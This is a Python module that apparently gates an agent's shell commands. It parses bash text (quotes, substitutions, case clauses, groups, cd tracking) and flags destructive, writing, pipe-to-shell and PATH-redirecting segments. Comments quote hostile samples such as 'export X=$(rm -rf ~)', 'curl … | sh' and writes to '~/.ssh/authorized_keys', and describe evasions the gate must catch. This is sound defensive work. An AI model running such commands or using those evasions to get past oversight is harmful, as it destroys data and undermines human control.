    are scanned as contexts of their own, also inside double quotes (CR-03, CR-51): a comment there
    ends at the newline, or at the closing backtick.

    When a quote or substitution never closes, the text cannot be trusted to split where bash splits
    it, and the result leads with :data:`UNPARSED_SHELL_SIGNATURE` as a command of its own.
    """
    return _join(text)[0]


def _join(text: str, *, strip_comments: bool = True) -> tuple[str, bool]:
    """:func:`_join_continuations`, and whether a comment that could hold a command was dropped.

    ``strip_comments=False`` leaves every ``#`` in the text, as ordinary characters: the reading that
    cannot hide anything behind a comment the stripper invented."""
    scan = _JoinScan(text, strip_comments)
    joined, _ = scan.scan(_JOIN_TOP)
    if not scan.balanced:
        joined = f"{UNPARSED_SHELL_SIGNATURE}\n{joined}"
    return joined, scan.hazard


MAX_GROUP_DEPTH = 64
"""How many groups, subshells and substitutions may be open at once before the text is not read (WR-01 / WR-51
it4). Splitting a nest of ``{ { { … } } }`` re-reads the text once per level and once per brace in it, so the time
grows with the cube of the depth (a 4 KB nest took 5 s, a 10 KB one 20 s on the event loop's thread), and no
command written by a person is anywhere near this deep. Deeper text gets the unparsed-shell placeholder, which
asks in every mode."""


def _nesting_too_deep(text: str) -> bool:
    """Does the text open more than :data:`MAX_GROUP_DEPTH` ``(`` / ``{`` / ``$(`` / ``${`` at once?

    One pass, quotes and escapes skipped. It only has to be a bound, not a parse: it over-counts a ``(`` that is
    a literal character, which can only make a very deep text ask."""
    depth = 0
    index = 0
    size = len(text)
    quote = ""
    while index < size:
        char = text[index]
        if char == "\\":
            index += 2
            continue
        if quote == "'":
            quote = "" if char == "'" else quote
        elif char in "'\"" and not quote:
            quote = char
        elif char == '"' and quote == '"':
            quote = ""
        elif quote == '"':
            if char == "$" and text[index + 1 : index + 2] in ("(", "{"):
                depth += 1
                index += 1
            elif char in ")}" and depth:
                depth -= 1
        elif char in "({":
            depth += 1
        elif char in ")}" and depth:
            depth -= 1
        if depth > MAX_GROUP_DEPTH:
            return True
        index += 1
    return False


def _classify_command_text(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[list[ShellSegment], list[str]]:
    """Join, strip comments and classify one command text — twice when a comment dropped could hide one.

    The comment stripper must never be able to HIDE a command (T-10-16). It is made to follow bash
    closely, but a ``#`` is not a comment in every context (a ``[[ =~ ]]`` regex, an extglob group).
    So when it dropped a comment holding ``;``, ``&``, ``|``, a backtick, ``<``, ``>``, ``$(`` or a word
    that starts with ``-`` (a redirection or a flag bash still runs, UF-1), the
    text is also classified with every ``#`` kept, and the segments of that second reading that the
    first lacks are added — but only the ones that matter (destructive, writing, an inline program,
    a pipe into a shell, an environment redirect). In the second reading a real comment is text: its
    words are unfamiliar programs and an apostrophe in it is an open quote, which says nothing about
    what bash runs. So a second reading that does not balance is not used (the first one stands, as
    the only reading bash can have run), and the words of a comment never add a segment merely for
    being unfamiliar (WR-02 / WR-52, WR-53).
    """
    if _nesting_too_deep(text):  # before the join, whose scan recurses once per level too
        return _classify_text(UNPARSED_SHELL_SIGNATURE, settings, cwd)
    joined, hazard = _join(text)
    second_cwd = cwd.copy() if (hazard and cwd is not None) else None
    segments, dropped = _classify_text(joined, settings, cwd)
    if hazard:
        kept, _ = _join(text, strip_comments=False)
        if not kept.startswith(UNPARSED_SHELL_SIGNATURE):
            more, _ = _classify_text(kept, settings, second_cwd)
            segments = [*segments, *(
                segment for segment in more
                if segment not in segments and (
                    segment.destructive or segment.write_targets or segment.inline_interpreter
                    or segment.pipe_to_shell or segment.env_redirect
                )
            )]
    return segments, dropped


# ------------------------------------------------------- working directory (finding R2a)

class _Cwd:
    """The directory the next segment runs in, carried along one top-level sequence.

    ``path`` is the directory as WRITTEN (``~/.ssh``, ``/tmp``, or a relative ``build``), or None
    for "wherever the command started" — the workspace, which is what the verdict resolves a bare
    relative target against. ``unresolvable`` means a ``cd`` whose target cannot be read off the
    command text (``cd $D``, ``cd "$(…)"``, ``popd``), which makes every later relative write
    unresolvable rather than silently workspace-local.

    Mutable on purpose: ``;``/``&&``/``||``/newline continue one shell, so a ``cd`` in front
    changes what follows it. A ``( … )`` subshell and a function body get a :meth:`copy`, because
    their ``cd`` does not outlive them; a ``{ … }`` group shares this object, because its does.

    ``env_redirect`` rides the same carrier (Phase 10, D-28): the shell's assignment scope is the
    same scope, so ``PATH=./d; ls`` taints the ``ls`` and ``( PATH=./d ); ls`` does not. It is only
    ever set, never cleared.
    """

    __slots__ = ("path", "unresolvable", "env_redirect")

    def __init__(
        self, path: str | None = None, unresolvable: bool = False, env_redirect: bool = False
    ) -> None:
        self.path = path
        self.unresolvable = unresolvable
        self.env_redirect = env_redirect

    def copy(self) -> _Cwd:
        return _Cwd(self.path, self.unresolvable, self.env_redirect)


def _apply_cd(cwd: _Cwd, argv: list[str]) -> None:
    """Move ``cwd`` the way this ``cd``/``pushd`` moves the shell (PRD §3.2 step 6, finding R2a)."""
    arguments = [
        token for token in argv[1:]
        if token == PREVIOUS_DIRECTORY or not token.startswith("-")
    ]
    target = arguments[0] if arguments else None
    if target is None:
        cwd.path, cwd.unresolvable = HOME_DIRECTORY, False
        return
    if target == PREVIOUS_DIRECTORY or any(bad in target for bad in UNRESOLVABLE_TARGET_CHARS):
        cwd.unresolvable = True
        return
    if ABSOLUTE_PATH_RE.match(target):
        cwd.path, cwd.unresolvable = _normalize(target), False
    elif not cwd.unresolvable:
        cwd.path = _normalize(posixpath.join(cwd.path, target) if cwd.path else target)


def _resolve_target(cwd: _Cwd, target: str) -> tuple[str, bool]:
    """Join a write target onto the directory it is written in — (target, unresolvable).

    PRD §3.2 step 8 reports targets as written; this only supplies the directory the shell is
    standing in, so the verdict resolves ``~/.ssh/authorized_keys`` rather than a bare
    ``authorized_keys`` it would place in the workspace (finding R2a).
    """
    if not target or ABSOLUTE_PATH_RE.match(target):
        return target, False
    if cwd.unresolvable:
        return target, True
    if cwd.path is None:
        return target, False
    return _normalize(posixpath.join(cwd.path, target)), False


def _normalize(path: str) -> str:
    """Collapse ``.`` and ``..`` in a joined path, keeping the spelling (tilde included)."""
    return posixpath.normpath(path) if path else path


# --------------------------------------------------------------------------- step 3

class _Raw:
    """One top-level command as the splitter found it, plus whether a pipe fed it."""

    __slots__ = ("text", "piped")

    def __init__(self, text: str, piped: bool) -> None:
        self.text = text
        self.piped = piped


def _split_top_level(text: str, track_braces: bool = True) -> list[_Raw]:
    """PRD §3.2 step 3: split at top-level ``&&``, ``||``, ``;``, ``|``, ``&`` and newline.

    Quotes, backslash escapes and backticks suspend splitting (``echo "a; b"`` is one
    command), and ``( )`` / ``{ }`` groups are kept whole for the caller to recurse into.

    A ``{`` opens a group only in command position (:func:`_command_position`) and followed by a blank;
    anywhere else it is a word (``echo { ; rm x`` prints ``{`` and runs ``rm``). If a group never
    closes, the text is split again with brace tracking off, so a brace that was wrongly taken for
    a group can only make the splitter split MORE (CR-04 / CR-53).
    """
    parts: list[_Raw] = []
    buffer: list[str] = []
    piped = False
    braces = 0
    index = 0
    quote: str | None = None

    def flush(next_piped: bool) -> None:
        nonlocal piped, buffer
        parts.append(_Raw("".join(buffer), piped))
        buffer = []
        piped = next_piped

    while index < len(text):
        char = text[index]
        if quote:
            buffer.append(char)
            if char == "\\" and quote in ('"', "`") and index + 1 < len(text):
                buffer.append(text[index + 1])
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\" and index + 1 < len(text):
            buffer.append(text[index : index + 2])
            index += 2
            continue
        if char in "'\"`":
            quote = char
            buffer.append(char)
            index += 1
            continue
        if char == "$" and text[index + 1 : index + 2] == "{":
            # A parameter expansion (or a bash 5.3 funsub) is one unit: `${x:-(}` opens no group and
            # the `;` of `${ cmd; }` splits nothing (WR-01).
            end = _matching_brace(text, index + 1)
            buffer.append(text[index : end + 1])
            index = end + 1
            continue
        previous = buffer[-1][-1:] if buffer else ""
        if (
            char == "c" and text.startswith("case", index)
            and text[index + 4 : index + 5] in (" ", "\t", "\n") and previous in GROUP_BRACE_BEFORE
            and _command_position("".join(buffer))
        ):
            # `case x in a) rm y;; esac` is one command: its `;;`, `|` and `)` split nothing.
            end = _case_end(text, index)
            buffer.append(text[index:end])
            index = end
            continue
        if char == "(":
            # A parenthesised unit (`$(…)`, `<(…)`, `( … )`, `f()`, `x=(…)`) is taken whole, so the `;;` and
            # `)` of a `case` inside it split nothing.
            end = _matching(text, index)
            buffer.append(text[index : end + 1])
            index = end + 1
            continue
        if (
            char == "{" and track_braces and previous in GROUP_BRACE_BEFORE
            and text[index + 1 : index + 2] in GROUP_BRACE_AFTER
            and _command_position("".join(buffer))
        ):
            # Only a `{` that is a word of its own, where a command may start, opens a group;
            # `{#`, `{a,b}`, `x{y` and the `{` of `echo { ; rm x` do not.
            braces += 1
            buffer.append(char)
            index += 1
            continue
        if char == "}" and braces and previous in GROUP_BRACE_BEFORE:
            braces -= 1
            buffer.append(char)
            index += 1
            continue
        if braces == 0:
            pair = text[index : index + 2]
            if char in "<>" or (char == "&" and text[index + 1 : index + 2] == ">"):
                # A redirection operator, fd duplication included: the `&` of `2>&1` or
                # `&> log` belongs to the operator, not to the `&` separator. Splitting
                # there invented a phantom `1` command and an empty write target.
                buffer.append(char)
                index += 1
                while index < len(text) and text[index] in REDIRECTION_OPERATOR_CHARS:
                    buffer.append(text[index])
                    index += 1
                continue
            if pair in ("&&", "||"):
                flush(False)
                index += 2
                continue
            if char == "|":
                flush(True)
                index += 1 + (1 if pair == "|&" else 0)
                continue
            if char in ";\n&":
                flush(False)
                index += 1
                continue
        buffer.append(char)
        index += 1
    flush(False)
    if braces and track_braces:
        return _split_top_level(text, track_braces=False)
    return parts


def _skip_word_part(text: str, index: int) -> int:
    """The index after the quote, escape or substitution that starts at ``index``; ``index + 1`` if none."""
    char = text[index]
    if char == "\\":
        return index + 2
    if char in "'\"":
        end = index + 1
        while end < len(text) and text[end] != char:
            end += 2 if (char == '"' and text[end] == "\\") else 1
        return end + 1
    if char == "`":
        return _closing_backtick(text, index) + 1
    if char == "$" and text[index + 1 : index + 2] == "(":
        return _matching(text, index + 1) + 1
    if char == "$" and text[index + 1 : index + 2] == "{":
        return _matching_brace(text, index + 1) + 1
    return index + 1


def _case_end(text: str, start: int) -> int:
    """The index just past the ``esac`` that closes the ``case`` at ``start`` (end of text if none)."""
    tracker = _CaseTracker()
    depth = 0
    index = start
    opened = False
    while index < len(text):
        step = _skip_word_part(text, index)
        if step != index + 1 or text[index] in "\\'\"`":
            tracker.opaque()
            index = step
            continue
        char = text[index]
        tracker.step(char, depth)
        if tracker.starts:
            opened = True
        elif opened:
            return index
        if char == "(":
            depth += 1
        elif char == ")" and not tracker.at_pattern_end(depth):
            depth = max(0, depth - 1)
        elif char == ")":
            tracker.pattern_end()
        index += 1
    tracker.step(" ", depth)
    return len(text)


def _case_pattern_end(text: str, start: int) -> int:
    """The index of the ``)`` that ends the pattern list starting at ``start``; -1 if none."""
    depth = 0
    index = start
    while index < len(text):
        step = _skip_word_part(text, index)
        if step != index + 1 or text[index] in "\\'\"`":
            index = step
            continue
        char = text[index]
        if char == "(":
            depth += 1
        elif char == ")":
            if depth == 0:
                return index
            depth -= 1
        index += 1
    return -1


def _case_clause_end(text: str, start: int) -> tuple[int, int] | None:
    """(end of the clause body, index to continue from) for the body starting at ``start``.

    The body ends at the ``;;`` / ``;&`` / ``;;&`` of its own clause, or before the ``esac`` that closes
    the whole ``case`` (then the continue index is that ``esac``'s end). A ``case`` nested in the body
    keeps its own terminators. None when neither is found."""
    tracker = _CaseTracker()
    depth = 0
    index = start
    while index < len(text):
        step = _skip_word_part(text, index)
        if step != index + 1 or text[index] in "\\'\"`":
            tracker.opaque()
            index = step
            continue
        char = text[index]
        if char == ";" and depth == 0 and not tracker.starts:
            for terminator in (";;&", ";;", ";&"):
                if text.startswith(terminator, index):
                    return index, index + len(terminator)
        tracker.step(char, depth)
        if tracker.stray:
            return index - 4, index - 4
        if char == "(":
            depth += 1
        elif char == ")" and not tracker.at_pattern_end(depth):
            depth = max(0, depth - 1)
        elif char == ")":
            tracker.pattern_end()
        index += 1
    tracker.step(" ", depth)
    if tracker.stray:
        return len(text) - 4, len(text) - 4
    return None


def _parse_case(text: str) -> tuple[list[str], list[str], str] | None:
    """Split ``case WORD in PATTERN) BODY ;; … esac`` into (subject and patterns, bodies, text after).

    None when it does not parse: the caller then fails toward asking."""
    size = len(text)

    def skip_blanks(index: int) -> int:
        while index < size and text[index] in " \t\n":
            index += 1
        return index

    def word_end(index: int) -> int:
        while index < size and text[index] not in " \t\n;&|<>()":
            step = _skip_word_part(text, index)
            index = step
        return index

    index = skip_blanks(4)
    subject_end = word_end(index)
    if subject_end == index:
        return None
    heads = [text[index:subject_end]]
    index = skip_blanks(subject_end)
    if text[index : index + 2] != "in" or text[index + 2 : index + 3] not in ("", " ", "\t", "\n", "("):
        return None
    index = skip_blanks(index + 2)
    bodies: list[str] = []
    while True:
        if text.startswith("esac", index) and text[index + 4 : index + 5] in ("", " ", "\t", "\n", ";", "&", "|", ")", ">", "<"):
            return heads, bodies, text[index + 4 :]
        if text[index : index + 1] == "(":
            index = skip_blanks(index + 1)
        pattern_end = _case_pattern_end(text, index)
        if pattern_end < 0:
            return None
        heads.append(text[index:pattern_end])
        clause = _case_clause_end(text, pattern_end + 1)
        if clause is None:
            return None
        body_end, index = clause
        bodies.append(text[pattern_end + 1 : body_end])
        index = skip_blanks(index)
        if index >= size:
            return None


FUNSUB_OPENERS = (" ", "\t", "\n", "|")
"""What follows the ``${`` of a bash 5.3 command substitution that needs no subshell (``${ cmd; }``,
``${| cmd; }``). Not the empty string: ``${`` at the end of the text opens nothing."""

GROUP_BRACE_BEFORE = ("", " ", "\t", "\n", ";", "&", "|", "(", ")")
GROUP_BRACE_AFTER = (" ", "\t", "\n", "")
"""What may stand either side of the ``{`` / ``}`` of a ``{ … }`` group: it is a word of its own, so a
blank, an operator or the start of the command before it (``{ ls; }``, ``{ ls;}``), a blank or the end after
the ``{``. ``{#``, ``{a,b}``, ``x{y`` and ``f}`` are words, not groups."""


COMMAND_POSITION_WORDS = frozenset({
    "if", "then", "elif", "else", "while", "until", "do", "!", "{", "time", "coproc",
})
TIME_VALUE_OPTIONS = frozenset({"-f", "-o", "--format", "--output"})
FUNCTION_HEAD_RE = re.compile(r"^(?:function\s+[^\s(){}]+(?:\s*\(\s*\))?|[^\s(){}]+\s*\(\s*\))$")
"""What may stand in front of a ``{`` that opens a group, in the text since the last separator: nothing,
grammar words that expect a command next (``then``, ``do``, ``!``, ``time [-p] [-f FMT]``,
``coproc [NAME]``, another ``{``) or the head of a function definition (``f()``, ``function f``)."""


def _command_position(prefix: str) -> bool:
    """Is ``prefix`` (the command text so far) only grammar that expects a command next?"""
    stripped = prefix.strip()
    if not stripped or FUNCTION_HEAD_RE.match(stripped):
        return True
    words = stripped.split()
    index = 0
    while index < len(words):
        word = words[index]
        index += 1
        if word == "time":
            while index < len(words) and words[index].startswith("-"):
                index += 2 if words[index] in TIME_VALUE_OPTIONS else 1
        elif word == "coproc":
            if index == len(words) - 1 and IDENTIFIER_RE.match(words[index]):
                index += 1  # `coproc NAME { … }`: NAME only when a compound command follows
        elif word not in COMMAND_POSITION_WORDS:
            # `{ f() {`, `then f() {`, `function f {`: the head of a definition is where a command may start (CR-03 it4)
            return bool(FUNCTION_HEAD_RE.match(" ".join(words[index - 1 :])))
    return True


def _matching_brace(text: str, open_index: int) -> int:
    """Index of the ``}`` closing the ``{`` at ``open_index``; end of string if unbalanced.

    ``{`` opens ``${…}``; a blank or ``|`` after it makes it a bash 5.3 funsub ``${ cmd; }`` /
    ``${| cmd; }`` whose body is a command list with groups of its own. Quotes, escapes, ``$(…)`` and
    nested ``${…}`` are stepped over whole; the first unquoted ``}`` closes a plain expansion.
    """
    after = text[open_index + 1 : open_index + 2]
    funsub = bool(after) and after in " \t\n|"
    groups = 0
    index = open_index + 1
    quote: str | None = None
    while index < len(text):
        char = text[index]
        if quote:
            if char == "\\" and quote in ('"', "`"):
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\":
            index += 2
            continue
        if char in "'\"`":
            quote = char
        elif char == "$" and text[index + 1 : index + 2] == "(":
            index = _matching(text, index + 1)
        elif char == "$" and text[index + 1 : index + 2] == "{":
            index = _matching_brace(text, index + 1)
        elif funsub and char == "{" and text[index - 1 : index] in GROUP_BRACE_BEFORE \
                and text[index + 1 : index + 2] in GROUP_BRACE_AFTER:
            groups += 1
        elif char == "}":
            if not funsub or not groups:
                return index
            groups -= 1
        index += 1
    return len(text)


def _function_body(text: str) -> str | None:
    """The body of a shell function definition, or None if this is not one.

    See :data:`FUNCTION_DEFINITION_RE`. The body has to be a real `{ … }` / `( … )` group, so a
    half-written definition falls back to ordinary classification rather than silently vanishing.
    """
    match = FUNCTION_DEFINITION_RE.match(text)
    if match is None:
        return None
    return _group_inner(match.group("body").strip())


def _group_inner(body: str) -> str | None:
    """Return the inside of a ``( … )`` or ``{ … }`` group, or None if this is not one."""
    if body.startswith("(") and body.endswith(")"):
        return body[1:-1]
    if body.startswith("{") and body.endswith("}") and body[1:2] in (" ", "\t", "\n"):
        return body[1:-1]
    return None


PREFIX_WORDS = frozenset({"if", "then", "elif", "else", "while", "until", "do", "!"})


def _compound_after_prefix(body: str) -> str | None:
    """The compound command (``{ … }``, ``( … )``, ``case … esac``) after leading grammar words, or None.

    ``then ( rm x )``, ``! { rm x; }``, ``time -p { rm x; }``, ``coproc NAME { rm x; }``: the words in
    front only say how the group is run, so the group is what gets classified (CR-05)."""
    rest = body
    while True:
        rest = rest.lstrip()
        word, end = _read_word(rest, 0)
        if word in PREFIX_WORDS:
            rest = rest[end:]
        elif word == "time":
            rest = rest[end:]
            while True:
                rest = rest.lstrip()
                option, end = _read_word(rest, 0)
                if not option.startswith("-"):
                    break
                rest = rest[end:]
                if option in TIME_VALUE_OPTIONS:
                    rest = rest.lstrip()
                    rest = rest[_read_word(rest, 0)[1] :]
        elif word == "coproc":
            rest = rest[end:].lstrip()
            name, end = _read_word(rest, 0)
            after = rest[end:].lstrip()
            if IDENTIFIER_RE.match(name) and after[:1] in ("{", "(") and not after.startswith("(("):
                rest = after  # `coproc NAME { … }`: NAME only when a compound command follows
        else:
            break
    if rest.startswith("(") or (rest.startswith("{") and rest[1:2] in (" ", "\t", "\n")):
        return rest
    if rest.startswith("case") and rest[4:5] in (" ", "\t", "\n"):
        return rest
    if rest is not body and FUNCTION_DEFINITION_RE.match(rest):
        return rest  # `then f() { … }`, `! function f { … }`: the definition is what gets classified (CR-03 it4)
    return None


def _classify_case(
    body: str, settings: GateSettings, cwd: _Cwd
) -> tuple[list[ShellSegment], list[str]]:
    """Classify ``case WORD in PATTERN) BODY ;; … esac``: every body is a command list (CR-05, WR-55).

    The subject and the patterns only matter for the substitutions in them. A ``case`` that does not
    parse gets the unparsed-shell placeholder: no mode runs text the classifier could not split."""
    parsed = _parse_case(body)
    if parsed is None:
        return _classify_text(UNPARSED_SHELL_SIGNATURE, settings, cwd)
    heads, bodies, after = parsed
    segments: list[ShellSegment] = []
    dropped: list[str] = []
    for head in heads:
        segments.extend(_lift_substitutions(head, settings, cwd)[1])
    for clause in bodies:
        clause_segments, clause_dropped = _classify_text(clause, settings, cwd)
        segments.extend(clause_segments)
        dropped.extend(clause_dropped)
    if after.strip():  # a redirection after `esac`
        tail_segments, tail_dropped = _classify_text(f": {after}", settings, cwd)
        segments.extend(tail_segments)
        dropped.extend(tail_dropped)
    return segments, dropped


def _classify_text(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[list[ShellSegment], list[str]]:
    """Steps 2-8 over a already-heredoc-stripped string; recursive for groups and payloads.

    ``cwd`` carries the directory a leading ``cd`` moved the shell to (finding R2a); a fresh one
    means "wherever the command started".
    """
    segments: list[ShellSegment] = []
    dropped: list[str] = []
    previous_head: str | None = None
    cwd = _Cwd() if cwd is None else cwd
    for raw in _split_top_level(text):
        body = raw.text.strip()
        if not body:
            previous_head = None
            continue
        compound = _compound_after_prefix(body)
        if compound is not None:
            body = compound  # `time { … }`, `then ( … )`, `! case …`: the prefix runs nothing itself
        if body.startswith("case") and body[4:5] in (" ", "\t", "\n"):
            case_segments, case_dropped = _classify_case(body, settings, cwd)
            segments.extend(case_segments)
            dropped.extend(case_dropped)
            previous_head = None
            continue
        inner = _group_inner(body)
        subshell = inner is not None and body.startswith("(")
        if inner is None:
            inner = _function_body(body)
            subshell = True  # a definition's `cd` runs when the function is CALLED, not here
        if inner is not None:
            group_segments, group_dropped = _classify_text(
                inner, settings, cwd.copy() if subshell else cwd
            )
            segments.extend(group_segments)
            dropped.extend(group_dropped)
            previous_head = None
            continue
        residual, lifted = _lift_substitutions(body, settings, cwd)
        segments.extend(lifted)
        host, extras, host_dropped, head = _classify_one(residual, settings, cwd)
        dropped.extend(host_dropped)
        if host is not None:
            if (
                raw.piped
                and previous_head in settings.pipe_to_shell_sources
                and head in settings.pipe_to_shell_sinks
                and not host.inline_interpreter
            ):
                # `pipe_to_shell` rather than the signature is what `auto` reads: the sink's
                # signature is a bare `sh` or `python3`, which means nothing on its own — the
                # danger is that the code arriving on the pipe has not been read by anyone.
                #
                # `not host.inline_interpreter` is what separates the two shapes that look
                # identical in a pipeline. `curl … | python3` and `curl … | sh` read their
                # PROGRAM from stdin: the download is the code, and nobody has seen it. `curl …
                # | python3 -c '<program>'` does not — the program is the `-c` argument, right
                # there on the command line, and the download is its DATA. Without this test the
                # rule fired on `curl -s localhost:8000/v1/models | python3 -c 'json.load(…)'`,
                # which was 9 of the 29 prompts a replay of the owner's 384-session corpus
                # raised in `auto`: a third of the whole ask budget spent on a command whose code
                # the person could read in the prompt itself. The sink still classifies as
                # `interpreter-inline`, which is where an inline program belongs.
                host = replace(host, destructive=True, read_only=False, pipe_to_shell=True)
            segments.append(host)
        segments.extend(extras)
        previous_head = head
    return segments, dropped


# --------------------------------------------------------------------------- step 2

def _lift_substitutions(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[str, list[ShellSegment]]:
    """PRD §3.2 step 2: lift ``$(…)``, backticks, ``<(…)`` and ``>(…)`` into their own segments.

    Recursive, and done *before* the drop rule of step 6, so ``export X=$(rm -rf ~)`` is
    classified by its inner command even though the ``export`` shell is dropped
    (critic finding 3). Single quotes suspend substitution; double quotes do not.
    """
    out: list[str] = []
    lifted: list[ShellSegment] = []
    index = 0
    in_double = False

    def recurse(inner: str) -> None:
        # A substitution runs in a subshell: it inherits the directory and cannot change ours.
        inner_segments, _ = _classify_text(inner, settings, (cwd or _Cwd()).copy())
        lifted.extend(inner_segments)

    while index < len(text):
        char = text[index]
        if char == "\\" and index + 1 < len(text):
            out.append(text[index : index + 2])
            index += 2
            continue
        if char == "'" and not in_double:
            end = text.find("'", index + 1)
            end = len(text) - 1 if end == -1 else end
            out.append(text[index : end + 1])
            index = end + 1
            continue
        if char == '"':
            in_double = not in_double
            out.append(char)
            index += 1
            continue
        if text[index : index + 3] == "$((" and _is_arithmetic(text, index + 1):
            # Arithmetic runs whatever `$(…)` and backticks it holds (`$(( $(rm x) + 1 ))`); nothing else.
            end = _matching(text, index + 1)
            _, inner_lifted = _lift_substitutions(text[index + 3 : end - 1], settings, cwd)
            lifted.extend(inner_lifted)
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        if char == "$" and text[index + 1 : index + 2] == "(":
            end = _matching(text, index + 1)
            recurse(text[index + 2 : end])
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        if char == "$" and text[index + 1 : index + 2] == "{" and text[index + 2 : index + 3] in FUNSUB_OPENERS:
            # CR-56: bash 5.3 `${ cmd; }` and `${| cmd; }` run their body in THIS shell, like `$(…)`.
            end = _matching_brace(text, index + 1)
            recurse(text[index + 2 + (text[index + 2] == "|") : end])
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        if char == "`":
            end = _closing_backtick(text, index)
            recurse(BACKTICK_ESCAPED_RE.sub(r"\1", text[index + 1 : end]))
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        if char in "<>" and not in_double and text[index + 1 : index + 2] == "(":
            end = _matching(text, index + 1)
            recurse(text[index + 2 : end])
            out.append(SUBSTITUTION_SENTINEL)
            index = end + 1
            continue
        out.append(char)
        index += 1
    return "".join(out), lifted


BACKTICK_ESCAPED_RE = re.compile(r"\\([$`\\])")
"""Inside backticks a backslash is literal except before ``$``, `` ` `` and ``\\``, where the shell drops it
before it runs the body (bash(1) "Command Substitution"): `` `echo \\`rm x\\`` `` runs ``echo `rm x` ``."""


def _closing_backtick(text: str, open_index: int) -> int:
    """Index of the backtick closing the one at ``open_index``, skipping backslash pairs; end if none (CR-55)."""
    index = open_index + 1
    while index < len(text):
        if text[index] == "\\":
            index += 2
        elif text[index] == "`":
            return index
        else:
            index += 1
    return len(text)


def _matching(text: str, open_index: int) -> int:
    """Index of the ``)`` closing the ``(`` at ``open_index``; end of string if unbalanced.

    The ``)`` that ends a ``case`` pattern inside it closes nothing (:class:`_CaseTracker`)."""
    depth = 0
    index = open_index
    quote: str | None = None
    tracker = _CaseTracker()
    while index < len(text):
        char = text[index]
        if quote:
            if char == "\\" and quote == '"' and index + 1 < len(text):
                index += 2
                continue
            if char == quote:
                quote = None
            index += 1
            continue
        if char == "\\":
            tracker.opaque()
            index += 2
            continue
        if char in "'\"":
            quote = char
            tracker.opaque()
            index += 1
            continue
        if char == "`":
            tracker.opaque()
            index = _closing_backtick(text, index) + 1
            continue
        if char == "$" and text[index + 1 : index + 2] == "{":
            tracker.opaque()
            index = _matching_brace(text, index + 1) + 1
            continue
        tracker.step(char, depth)
        if char == "(":
            depth += 1
        elif char == ")":
            if tracker.at_pattern_end(depth):
                tracker.pattern_end()
            else:
                depth -= 1
                if depth == 0:
                    return index
        index += 1
    return len(text)


# --------------------------------------------------------------------------- steps 4-8

def _classify_one(
    text: str, settings: GateSettings, cwd: _Cwd | None = None
) -> tuple[ShellSegment | None, list[ShellSegment], list[str], str | None]:
    """One command: redirections, drop rule, wrapper peel, payload lift, signature, targets.

    Returns ``(host segment or None if dropped, lifted payload segments, dropped texts,
    head token)``. PRD §3.2 steps 4-8. A ``cd`` here moves ``cwd`` for the segments after it.
    """
    cwd = _Cwd() if cwd is None else cwd
    command_text, redirect_targets = _extract_redirections(text)
    argv, prefix_assignments = _strip_prefixes(_tokenize(command_text))
    program = argv[0] if argv else ""  # as written: the verdict's tool-script rule reads the path
    if argv:
        argv = [_basename(argv[0]), *argv[1:]]
    # An assignment that redirects what runs is recognised BEFORE the drop paths below discard it:
    # `PATH=./d;` and `export PATH=./d` are dropped segments, yet every later segment of this shell
    # runs under them (D-28). The flag is only ever set here, never cleared.
    if _sequence_env_redirect(argv, prefix_assignments, settings):
        cwd.env_redirect = True
    if not argv:
        if not redirect_targets:
            return None, [], [text.strip()] if text.strip() else [], None
        return (
            _make_segment(REDIRECT_ONLY_SIGNATURE, (), settings, redirect_targets, cwd=cwd),
            [], [], None,
        )

    # The directory moves whether or not the segment is dropped (finding R2a).
    if argv[0] in DIRECTORY_CHANGE_COMMANDS:
        _apply_cd(cwd, argv)
    elif argv[0] in DIRECTORY_RESTORE_COMMANDS:
        cwd.unresolvable = True

    # Step 6 — drop only the exact no-op segments; after step 2 no substitution survives here.
    if argv[0] in settings.dropped_commands and not redirect_targets:
        return None, [], [text.strip()], argv[0]

    peeled, peeled_assignments, directories = _peel(argv, settings)
    if not peeled:
        return None, [], [text.strip()], None
    if peeled is not argv and _sequence_env_redirect(peeled, [], settings):
        cwd.env_redirect = True  # `builtin export PATH=./d`, `command export …`
    if len(peeled) < len(argv):
        program = peeled[0]  # only the wrapper's word was shortened; the peeled one is as written
    # `NAME=v cmd` and `env NAME=v cmd` hit one rule (D-27); it applies to this command and to
    # every payload lifted from it (D-57), never to the commands after it.
    env_redirect = _assignments_redirect([*prefix_assignments, *peeled_assignments], settings)
    if directories:
        # `env -C DIR cmd` runs `cmd` in DIR and leaves this shell where it is (WR-02).
        cwd = cwd.copy()
        for directory in directories:
            if directory.startswith("-"):
                cwd.unresolvable = True
            else:
                _apply_cd(cwd, ["cd", directory])
    return _build(
        peeled, settings, redirect_targets, cwd, program=program, env_redirect=env_redirect
    )


def _strip_prefixes(argv: list[str]) -> tuple[list[str], list[str]]:
    """Drop the leading tokens that are not the command: keywords and ``K=V`` assignments.

    ``A=1 rm -rf x`` is a plain shell assignment prefix — the same evasion ``env A=1 rm -rf x``
    uses, without the ``env`` (PRD §3.2 step 4). See :data:`SHELL_KEYWORDS`.

    Returns the remaining argv and the ``K=V`` tokens it skipped (keywords are skipped but not
    reported), so the caller can ask whether an assignment redirects what runs (D-25).
    """
    index = 0
    assignments: list[str] = []
    while index < len(argv):
        token = argv[index]
        if token in SHELL_KEYWORDS:
            index += 1
        elif ASSIGNMENT_RE.match(token):
            assignments.append(token)
            index += 1
        else:
            break
    return argv[index:], assignments


def _is_redirect_env_name(name: str, settings: GateSettings) -> bool:
    """True when ``name`` is on the settings' env-redirect table and not excluded (D-25, D-26).

    Case-sensitive, unlike :func:`_is_dangerous_git_key`: environment names are."""
    return name not in ENV_REDIRECT_EXCLUDED and any(
        fnmatch.fnmatchcase(name, pattern) for pattern in settings.exec_redirect_env_vars
    )


def _value_keeps_tier(value: str, settings: GateSettings) -> bool:
    """True when a command-valued variable's VALUE is itself a read-only command line (D-38).

    The value goes through the full classifier with :data:`OPERAND_PLACEHOLDER` appended, because
    git appends its operands; it keeps the tier only when there is at least one segment and every
    segment is read-only with no write targets, no env redirect and no inline danger. Recursion is
    bounded by the value's own length: each level classifies a strictly shorter string.

